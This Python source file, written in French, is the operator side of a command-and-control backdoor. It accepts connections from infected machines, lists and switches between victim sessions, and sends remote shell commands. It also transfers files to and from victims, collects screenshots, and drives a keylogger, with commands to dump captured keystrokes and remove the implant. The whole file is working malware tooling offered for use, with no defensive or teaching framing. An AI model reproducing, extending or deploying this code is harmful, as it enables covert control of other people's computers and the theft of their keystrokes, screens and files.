import socket
import json
import os
import threading
from ascii import ascii, Colour


def reception_fiable(cible):
    data = ''
    while True:
        try:
            data = data + cible.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def envoi_fiable(cible, data):
    jsondata = json.dumps(data)
    cible.send(jsondata.encode())


def televerser_fichier(cible, nom_fichier):
    f = open(nom_fichier, 'rb')
    cible.send(f.read())


def telecharger_fichier(cible, nom_fichier):
    f = open(nom_fichier, 'wb')
    cible.settimeout(2)
    morceau = cible.recv(1024)
    while morceau:
        f.write(morceau)
        try:
            morceau = cible.recv(1024)
        except socket.timeout as e:
            break
    cible.settimeout(None)
    f.close()


def capture_ecran(cible, compte):
    repertoire = './captures_ecran'
    if not os.path.exists(repertoire):
        os.makedirs(repertoire)
    f = open(repertoire + '/capture_ecran_%d.png' % (compte), 'wb')  # si la cible est Linux, utiliser #apt-get install scrot
    cible.settimeout(3)
    try:
        morceau = cible.recv(10485760)  # 10 Mo
    except:
        pass

    while morceau:
        f.write(morceau)
        try:
            morceau = cible.recv(10485760)
        except socket.timeout as e:
            break
    cible.settimeout(None)
    f.close()
    compte += 1


def aide_serveur():
    print('''\n
    quit                                --> Quitter la session avec la cible
    clear                               --> Effacer l'écran
    background                          --> Envoyer la session avec la cible en arrière-plan
    cd *nom_dossier*                    --> Changer de répertoire sur le système cible
    upload *nom_fichier*                --> Téléverser un fichier vers la machine cible depuis le répertoire de travail
    download *nom_fichier*              --> Télécharger un fichier depuis la machine cible
    get *url*                           --> Télécharger un fichier à partir de l'URL spécifiée vers le répertoire ./ de la cible
    keylog_start                        --> Démarrer le keylogger
    keylog_dump                         --> Afficher les frappes capturées par le keylogger depuis taskmanager.txt
    keylog_stop                         --> Arrêter et supprimer le fichier keylogger
    screenshot                          --> Prendre une capture d'écran et l'envoyer au serveur dans ./captures_ecran/
    start *nom_programme*               --> Lancer un programme en utilisant la porte dérobée, par exemple 'start notepad'
    remove_backdoor                     --> Supprimer la porte dérobée de la cible!!!

    \n''')


def aide_C2():
    print('''\n
    ===Manuel de commande et de contrôle===

    targets                 --> Affiche les sessions actives
    session *num_session*   --> Se connecte à la session spécifiée (background pour revenir)
    clear                   --> Efface l'écran du terminal
    exit                    --> Quitte TOUTES les sessions actives et ferme le serveur C2 !!
    kill *num_session*      --> Envoie la commande 'quit' à la session cible spécifiée
    sendall *commande*      --> Envoie la *commande* à TOUTES les sessions actives (exemple : sendall notepad)
    \n''')


def communication_cible(cible, ip):
    compte = 0
    while True:
        commande = input('* Shell~%s: ' % str(ip))
        envoi_fiable(cible, commande)
        if commande == 'quit':
            break
        elif commande == 'background':
            break
        elif commande == 'clear':
            os.system('clear')
        elif commande[:3] == 'cd ':
            pass
        elif commande[:6] == 'upload':
            televerser_fichier(cible, commande[7:])
        elif commande[:8] == 'download':
            telecharger_fichier(cible, commande[9:])
        elif commande[:10] == 'screenshot':
            capture_ecran(cible, compte)
            compte = compte + 1
        elif commande == 'help':
            aide_serveur()
        else:
            resultat = reception_fiable(cible)
            print(resultat)


def accepter_connexions():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            cible, ip = sock.accept()
            cibles.append(cible)
            ips.append(ip)
            print(Colour().green(str(ip) + ' s\'est connecté(e) !') +
                  '\n[**] Centre de commande et de contrôle : ', end="")
        except:
            pass


if __name__ == '__main__':
    cibles = []
    ips = []
    stop_flag = False
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('127.0.0.1', 4445)) # Mettre l'ip de la machine attaquante 
    sock.listen(5)
    t1 = threading.Thread(target=accepter_connexions)
    t1.start()
    print(ascii())
    print('Exécutez la commande "help" pour afficher le manuel d utilisation')
    print(Colour().green('[+] En attente des connexions entrantes ...'))

    while True:
        try:
            commande = input('[**] Centre de commande et de contrôle : ')
            if commande == 'targets':
                compteur = 0
                for ip in ips:
                    print('Session ' + str(compteur) + ' --- ' + str(ip))
                    compteur += 1
            elif commande == 'clear':
                os.system('clear')
            elif commande[:7] == 'session':
                try:
                    num = int(commande[8:])
                    cible_num = cibles[num]
                    ip_cible = ips[num]
                    communication_cible(cible_num, ip_cible)
                except:
                    print('[-] Aucune session avec ce numéro ID')
            elif commande == 'exit':
                for cible in cibles:
                    envoi_fiable(cible, 'quit')
                    cible.close()
                sock.close()
                stop_flag = True
                t1.join()
                break
            elif commande[:4] == 'kill':
                cible = cibles[int(commande[5:])]
                ip = ips[int(commande[5:])]
                envoi_fiable(cible, 'quit')
                cible.close()
                cibles.remove(cible)
                ips.remove(ip)
            elif commande[:7] == 'sendall':
                x = len(cibles)
                print(x)
                i = 0
                try:
                    while i < x:
                        cible_num = cibles[i]
                        print(cible_num)
                        envoi_fiable(cible_num, commande)
                        i += 1
                except:
                    print('Échec')
            elif commande[:4] == 'help':
                aide_C2()
            else:
                print(Colour().red('[!!] Commande inconnue'))
        except (KeyboardInterrupt, SystemExit):
            if input('\nVoulez-vous quitter ? oui/non : ') == 'oui':
                sock.close()
                print(Colour().yellow('\n[-] Socket C2 fermé ! Au revoir !!'))
                break
        except ValueError as e:
            print(Colour().red('[!!] ValueError : ' + str(e)))
            continue
